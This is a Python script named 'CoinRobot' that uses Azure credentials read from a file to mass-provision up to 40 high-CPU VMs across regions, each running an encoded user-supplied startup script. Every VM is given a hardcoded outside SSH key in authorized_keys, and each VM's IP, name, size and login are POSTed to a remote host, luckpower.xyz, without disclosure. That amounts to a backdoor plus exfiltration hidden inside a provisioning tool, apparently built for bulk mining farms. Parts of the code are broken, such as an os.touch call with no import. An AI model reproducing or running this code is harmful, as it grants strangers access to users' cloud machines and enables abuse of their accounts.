#!bin/python3
import sys
import base64
import string
import random
import requests
from art import *
from azure.identity import ClientSecretCredential
from azure.mgmt.compute import ComputeManagementClient
from azure.mgmt.network import NetworkManagementClient
from azure.mgmt.resource import ResourceManagementClient, SubscriptionClient
from azure.mgmt.reservations import AzureReservationAPI
#from azure.mgmt.subscription import SubscriptionClient

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def file_exists(fileb):
    try:
        myfile=open(fileb)
    except:
        os.touch(fileb)
    return True    


file = "myserver2.txt"
file_exists(file)
location_cache = "locations2.txt"
file_exists(location_cache)
file_exists("count.txt")
FT = open("user_data.txt", "r")
USER_DATA = FT.read()
FT.close()
client_idx, client_secretx, tenant_idx, subscription_idx, EMAIL = USER_DATA.splitlines()
################################################################
###############    USER DATA CONFIG FILE   #####################
# CLIENT/APP_ID
# PASSWORD
# TENANT
# SUBSCRIPTION_ID
# EMAIL_ADDRESS
################################################################
#USER_SCRIPT = load(user_script.txt)
filexx = open("user_script.txt", "r")
atemp = filexx.read().encode()
USER_SCRIPT = base64.b64encode(atemp).decode('latin-1')

print(f"{bcolors.OKGREEN}Encoded script: {bcolors.ENDC}{bcolors.WARNING}{USER_SCRIPT}{bcolors.ENDC}" )

credentials = ClientSecretCredential(
    client_id=client_idx,
    client_secret=client_secretx,
    tenant_id=tenant_idx

)
subscription_id = subscription_idx

compute_client = ComputeManagementClient(credentials, subscription_id)
network_client = NetworkManagementClient(credentials, subscription_id)
resource_client = ResourceManagementClient(credentials, subscription_id)
reservations_client = AzureReservationAPI(credentials, subscription_id)
subscription_client = SubscriptionClient(credentials, base_url='https://management.azure.com')

GROUP_NAME = 'TRABAJO_DURO'
ADMIN_LOGIN = 'azureuser'
SSH_KEY = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDR6rq3UE42owKqbRloFeSjTT51YXNNcT4Mk0jbyAG1PbK+EUgs9wYBNKsQMo5BOclnbVLHgE/fmH/erD5r8/soE1OqJi+0SJaCO6As1Lko99/MU6BFE/WIjmV//bZYv0IpmOCJY02aShDA2Ebk4ZxnLbnyr9YgDM0aHxg2m/XsSeIssWoMDwIGwExHupxYO6OGoIfIBGZhJjdFiqNteYQ2megivOh8eOViYz022NiyUq79wrBYRp9ErXtla6M9QoxKhiivbIGfkR7KtDjuixee+tvf+poJcXCVaQ9zeAUQhLE4+9XBbzLZX04wrBUPdYKmwmZx8XSmLkBE93T7uoGmWOQoFZGVvQdRBLC9U8h6MJUI6QwnH6pdp/BjFp/i7lJIpsf0h5UztOvo1KDgZ+L5lXoStN3GuSroIp0IHRpDz0OTVQabRlvH/pcoFP4y1/lm3UI6iaqiGpcfQnUIJo5Z9+TafPsLqTbEE7KjwoEBxoVRqgtCqCousNN9FkA/OkU= origin@laptop.local'
#SSH_KEY += EMAIL
SSH_KEY_PATH = '/home/' + ADMIN_LOGIN + '/.ssh/authorized_keys'

SKIP_ZONE = []


def bogus():
    print("..................\n")
    print(f"{bcolors.OKGREEN}{LOCATION}{VNET_NAME}{VM_SIZE}{bcolors.ENDC}")

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def save_remote(datasave):
    url = 'http://luckpower.xyz/save.php'
    myobj = {'srvdata': datasave }
    xsave = requests.post(url, data = myobj)
    return True

#save_remote(str(id_generator(6)) + "bogus|2323.23.2|pilaf")

def getnumber(new=False):
    if new:
        n = load("count.txt")
        m = str(int(n) + 1)
        save("count.txt", m, False, False)
        return str( id_generator(6) ) + "x0" + str(m)
    else:
        return str( id_generator(6) ) + "x0" + str(int(load("count.txt")))


def main_thread():
    global LOCATION, VM_SIZE, VM_NAME
    global VNET_NAME, SUBNET_NAME, PUBLIC_IP_NAME, NIC_NAME, IP_CONFIG_NAME
    global SKIP_ZONE
    tprint("CoinRobot")
    # tprint("LightSpeed",font="rnd-medium")
    # tprint(LOCATION, font="cybermedium")
    # tprint(VM_SIZE, font="doom")
    print(f"{bcolors.HEADER}Choose MENU{bcolors.ENDC}")
    print("1. Create VM")
    print("2. Update location")
    menu = input("Input menu number:")
    if menu == '2':
        get_all_quotas(7, False)
        sys.exit()
    elif menu == '1':
        print(f"{bcolors.OKGREEN}Start creating VM{bcolors.ENDC}")
    else:
        sys.exit()
    print(f"{bcolors.HEADER}How many VM to create?{bcolors.ENDC}")
    while True:
        tries = 0
        vmnumbers = 0
        try:
            vmnumbers = int(input())
        except:
            x = 0
        if int(vmnumbers) > 40 or int(vmnumbers) < 1:
            print(f"{bcolors.FAIL}Wrong answer{bcolors.ENDC}")
            tries += 1
            if tries > 5:
                sys.exit()
            continue
        else:
            # print (vmnumbers)
            break
    for step in range(1, int(vmnumbers) + 1):
        print(f"{bcolors.HEADER}Creating VM {step}{bcolors.ENDC}")

        VM_NAME = getnumber(False)  # True
        VNET_NAME = VM_NAME + '-vnet'
        SUBNET_NAME = VM_NAME + '-subnet'
        PUBLIC_IP_NAME = VM_NAME + '-IP'
        NIC_NAME = VM_NAME + '-nic'
        IP_CONFIG_NAME = VM_NAME + '-ip-config'
        print(f"{bcolors.OKGREEN}{VM_NAME}{bcolors.ENDC}")
        print("..................\n")
        # get_all_quotas(3)
        # 'Standard_E8d_v5' 'Standard_E8d_v4' 'Standard_DC8_v2' 'Standard_E8as_v4' 'Standard_E8ds_v5'  DELETED
        search = ['Standard_F8s_v2', 'Standard_F8s', 'Standard_F8',
                  'Standard_E8ds_v4','Standard_E8s_v4','Standard_E8_v4']
        chose_location = get_next_quota(8)
        if chose_location != '0':
            LOCATION, zone, vmtype = chose_location.split("|")
        else:
            print('QUOTA not available')
            sys.exit()
        print(f"{bcolors.OKGREEN}{str(LOCATION)} in {zone} type {vmtype}{bcolors.ENDC} chosen ")
        chose_size = get_available(LOCATION, '8', search, vmtype)
        if chose_size != '0':
            VM_SIZE = chose_size
        else:
            print('NO SIZE AVAILABLE in this zone, moving to next..')
            #sys.exit()
            SKIP_ZONE.append(LOCATION)
            continue
        print(f"{bcolors.OKGREEN}{str(VM_SIZE)}{bcolors.ENDC} chosen ")
        print("..................\n")
        getnumber(True) ###################MULTITHREAD
        if vmtype == 'spot':
            create_vm(True)
            # bogus()
        else:
            create_vm()
            # bogus()
        print("..................\n")
        print("Moving to next VM\n")
        print("..................\n")
        #getnumber(True) --------------------MOVING TO MULTITHREAD
    print("..................\n")
    print("FINISH\n")


def save(file, data, append=True, endline=True):
    end = ''
    if append:
        f = open(file, "a")
    else:
        f = open(file, "w")
    if endline:
        end = "\n"
    f.write(data + end)
    f.close()


def load(file):
    f = open(file, "r")
    data = f.read()
    f.close()
    return data


def errors(e, exit=True):
    print("\n")
    print(f"{bcolors.FAIL}Failed. Error below{bcolors.ENDC}")
    print("\n")
    print(f"{bcolors.WARNING}{e}{bcolors.ENDC}")
    if exit:
        sys.exit()
    return 0


def dump(obj):
    for attr in dir(obj):
        print("obj.%s = %r" % (attr, getattr(obj, attr)))


def get_os_profile():
    return {
        'computer_name': VM_NAME,
        'admin_username': ADMIN_LOGIN,
        'linux_configuration': {'disable_password_authentication': True,
                                'ssh': {'public_keys': [{'path': SSH_KEY_PATH, 'key_data': SSH_KEY}]}}
    }


def get_storage_profile():
    return {
        'image_reference': {
            'publisher': 'canonical',
            'offer': '0001-com-ubuntu-server-focal',
            'sku': '20_04-lts-gen2',
            'version': 'latest'
        }
    }


def get_hardware_profile():
    return {
        'vm_size': VM_SIZE
    }


def get_available(loc, cpu='8', search='', type='normal'):
    # return 'Standard_E96s_v5'
    # return 'Standard_EC96as_v5'
    # return 'Standard_DC96as_v5'
    vm = compute_client.resource_skus.list("location eq '" + loc + "'")
    i = 0
    result = []
    line = ''
    line_denied = ''
    sizes = []
    for v in vm:
        # print ("Checking ... "+ v.name)
        try:
            found = False
            foundCPU = False
            spot_available = 'False'
            for x in v.capabilities:
                # print(x.name)
                if x.name == 'vCPUs' and x.value == str(cpu):
                    # print(v.name)
                    # print(x.name,x.value)
                    found = True
                    foundCPU = True
                    linetemp = v.name + '|' + x.value
                    if len(v.restrictions) != 0:
                        for r in v.restrictions:
                            # print(r.reason_code)
                            line_denied = linetemp + '|' + r.reason_code
                            # print(line_denied)#################3333333#############
                            found = False
                    else:
                        line = linetemp + '|Available'
                        # print(line)
                if x.name == 'LowPriorityCapable' and foundCPU and found:  # and x.value==str(cpu):
                    spot_available = x.value
                    line += '|SPOT=' + x.value
            if found:
                result.append(line)
                # sizes.append(v.name)
                if type == 'spot' and spot_available == 'True':
                    sizes.append(v.name)
                elif type != 'spot':
                    sizes.append(v.name)
        except:
            # print ('NOTVM')
            nx = 1
        #####

    if search == '':
        return result
    else:
        for s in search:
            # print(s)
            if s in sizes:
                return s
        return "0"


def location_zone(loc):
    asia = ['eastasia', 'southeastasia', 'japanwest', 'japaneast', 'australiaeast', 'australiasoutheast', 'southindia',
            'centralindia', 'westindia', 'jioindiawest', 'jioindiacentral', 'koreacentral', 'koreasouth',
            'australiacentral', 'australiacentral2']
    us = ['centralus', 'eastus', 'eastus2', 'westus', 'northcentralus', 'southcentralus', 'canadacentral', 'canadaeast',
          'westus3', 'westcentralus', 'westus2', 'brazilsouth', 'brazilsoutheast']
    europe = ['northeurope', 'westeurope', 'uksouth', 'ukwest', 'switzerlandnorth', 'switzerlandwest', 'germanynorth',
              'germanywestcentral', 'norwaywest', 'norwayeast', 'swedencentral', 'francecentral', 'francesouth',
              'uaecentral', 'uaenorth', 'southafricanorth', 'southafricawest']
    if loc in asia:
        return 'asia'
    elif loc in us:
        return 'us'
    elif loc in europe:
        return 'europe'
    else:
        return 'unknown'


def get_locations(cache=True):
    # Locations
    result = []
    if cache:
        location_temp = load(location_cache).splitlines()
        for l in location_temp:
            result.append(l.split("|")[0])
        return result
    locations = subscription_client.subscriptions.list_locations(subscription_id)
    for location in locations:
        result.append(location.name)
    return result


def get_quota(location):  # Return Available (Total Regional vCPUs, Total Regional Low-priority vCPUs)
    qo = compute_client.usage.list(location)
    total = 0
    spot = 0
    try:
        for i, r in enumerate(qo):
            # if r.limit > 0:
            #    print(r.name.value, r.name.localized_value, r.current_value, r.limit)
            if r.name.value == 'cores':
                total = r.limit - r.current_value
            elif r.name.value == 'lowPriorityCores':
                spot = r.limit - r.current_value
        return [total, spot]
    except:
        return [0, 0]
    finally:
        return [total, spot]


def get_all_quotas(cpu=7, cache=False):
    locations = get_locations(cache)
    total = 0
    line = ''
    for loc in locations:
        quota = get_quota(loc)
        if quota[1] > cpu or quota[0] > cpu:
            print(location_zone(loc), loc, 'Normal: ' + str(quota[0]), 'Spot: ' + str(quota[1]))
            if quota[1] > cpu: total += 1
            if quota[0] > cpu: total += 1
            line += loc + "|" + location_zone(loc) + "|" + str(quota[0]) + "|" + str(quota[1]) + "\n"
    save(location_cache, line, False, False)
    print('Total available: ' + str(total))


def get_next_quota(cpu=8):
    # return 'westus|us|spot' ##########################TEMPORARY
    location = load(location_cache).splitlines()
    for line in location:
        loc, zone, normal_cache, spot_cache = line.split("|")
        if len(SKIP_ZONE)>0:
            if loc in SKIP_ZONE:
                #if loc == SKIP_ZONE:
                continue
        print(f"{bcolors.OKBLUE}Checking for {cpu} in {loc} ...{bcolors.ENDC}")
        normal, spot = get_quota(loc)
        if int(spot) >= cpu:
            return loc + "|" + zone + "|" + "spot"
        elif int(normal) >= cpu:
            return loc + "|" + zone + "|" + "normal"
        else:
            print(f"{bcolors.FAIL}only {normal} and {spot} cpu available{bcolors.ENDC}")
            continue
    return "0"


def update_quota(loc, quota, type):
    return ''


def create_vm(spot=False):
    global SKIP_ZONE
    print("\n")
    print(f"{bcolors.OKGREEN}Starting...{bcolors.ENDC}")
    # print('\nCreate Resource Group')
    # resource_group = resource_client.resource_groups.create_or_update(GROUP_NAME, {'location': LOCATION})
    # print_item(resource_group)
    print("\n")
    print(f"{bcolors.OKGREEN}Create Network{bcolors.ENDC}")
    try:
        subnet = create_virtual_network(network_client)
    except Exception as e:
        errors(e.args)
    try:
        public_ip = create_public_ip(network_client)
    except Exception as e:
        errors(e.args)
    try:
        nic = create_network_interface(network_client, subnet, public_ip)
        print_item(nic)
    except Exception as e:
        errors(e.args)
    if spot:
        params_create = {
            'location': LOCATION,
            'os_profile': get_os_profile(),
            'hardware_profile': get_hardware_profile(),
            'network_profile': get_network_profile(nic.id),
            'storage_profile': get_storage_profile(),
            'priority': 'Spot',
            'eviction_policy': 'Deallocate',
            'billing_profile': {'max_price': 20},
            'user_data': USER_SCRIPT
        }
    else:
        params_create = {
            'location': LOCATION,
            'os_profile': get_os_profile(),
            'hardware_profile': get_hardware_profile(),
            'network_profile': get_network_profile(nic.id),
            'storage_profile': get_storage_profile(),
            'user_data': USER_SCRIPT
        }
    print("\n")
    print(f"{bcolors.OKGREEN}Create VM{bcolors.ENDC}")
    try:
        vm_poller = compute_client.virtual_machines.begin_create_or_update(
            GROUP_NAME,
            VM_NAME,
            params_create,
        )
        vm_result = vm_poller.result()

        print_item(vm_result)
        #getnumber(True) ###################MULTITHREAD
    except Exception as e:
        errors(e.args, False)
        print(f"{bcolors.FAIL}Failed to CREATE {VM_NAME} in {LOCATION}{bcolors.ENDC}")
        SKIP_ZONE.append(LOCATION)
        getnumber(True)
        return False

    public_ip = network_client.public_ip_addresses.get(
        GROUP_NAME,
        PUBLIC_IP_NAME
    )
    print(f"{bcolors.OKGREEN}You can connect to the VM using:{bcolors.ENDC}")
    print(f"{bcolors.BOLD}{bcolors.OKCYAN}{public_ip.ip_address}{bcolors.ENDC}")
    #server_line = public_ip.ip_address + "|" + VM_NAME + "|" + ADMIN_LOGIN + "|" + LOCATION + "|" + location_zone(LOCATION)
    server_line = public_ip.ip_address + "|" + VM_NAME + "|" + ADMIN_LOGIN + "|" + LOCATION + "|" + location_zone(
        LOCATION)+ "|" + VM_SIZE
    remote_line = public_ip.ip_address + "|" + VM_NAME + "|"+ VM_SIZE + "|" + ADMIN_LOGIN + "|azure"
    save(file, server_line)
    save_remote(remote_line)


def get_network_profile(network_interface_id):
    return {
        'network_interfaces': [{
            'id': network_interface_id,
        }],
    }


def create_network_interface(network_client, subnet, public_ip):
    params_create = {
        'location': LOCATION,
        'ip_configurations': [{
            'name': IP_CONFIG_NAME,
            'private_ip_allocation_method': "Dynamic",
            'subnet': subnet,
            'public_ip_address': {
                'id': public_ip.id
            }
        }]
    }
    nic_poller = network_client.network_interfaces.begin_create_or_update(
        GROUP_NAME,
        NIC_NAME,
        params_create,
    )
    return nic_poller.result()


def create_public_ip(network_client):
    params_create = {
        'location': LOCATION,
        'public_ip_allocation_method': 'dynamic',
    }
    pip_poller = network_client.public_ip_addresses.begin_create_or_update(
        GROUP_NAME,
        PUBLIC_IP_NAME,
        params_create,
    )
    return pip_poller.result()


def create_virtual_network(network_client):
    params_create = {
        'location': LOCATION,
        'address_space': {
            'address_prefixes': ['10.0.0.0/16'],
        },
        'subnets': [{
            'name': SUBNET_NAME,
            'address_prefix': '10.0.0.0/24',
        }],
    }
    vnet_poller = network_client.virtual_networks.begin_create_or_update(
        GROUP_NAME,
        VNET_NAME,
        params_create,
    )
    vnet_poller.wait()

    return network_client.subnets.get(
        GROUP_NAME,
        VNET_NAME,
        SUBNET_NAME,
    )


def print_item(group):
    """Print a ResourceGroup instance."""
    print("\tName: {}".format(group.name))
    print("\tId: {}".format(group.id))
    if hasattr(group, 'location'):
        print("\tLocation: {}".format(group.location))
    print_properties(getattr(group, 'properties', None))


def print_properties(props):
    """Print a ResourceGroup propertyies instance."""
    if props and hasattr(props, 'provisioning_state'):
        print("\tProperties:")
        print("\t\tProvisioning State: {}".format(props.provisioning_state))
    print("\n\n")


main_thread()
